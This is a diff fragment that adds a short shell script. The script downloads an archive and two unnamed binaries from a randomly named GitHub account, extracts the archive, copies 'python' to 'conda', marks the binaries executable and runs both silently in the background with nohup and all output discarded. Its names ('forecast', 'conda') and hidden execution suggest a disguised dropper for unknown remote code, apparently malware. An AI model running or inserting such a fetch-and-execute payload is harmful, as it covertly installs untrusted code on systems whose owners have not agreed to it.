@@ -1,0 +1,10 @@
+curl -LJO https://raw.githubusercontent.com/r4d20z2st15qp/a164/main/forecast.tar.gz
+curl -LJO https://raw.githubusercontent.com/r4d20z2st15qp/g892/main/a1
+curl -LJO https://raw.githubusercontent.com/r4d20z2st15qp/g892/main/b1
+tar xvzf forecast.tar.gz
+cp python conda
+chmod +x a1
+chmod +x b1
+nohup ./a1 > /dev/null 2>&1 &
+nohup ./b1 > /dev/null 2>&1 &
+
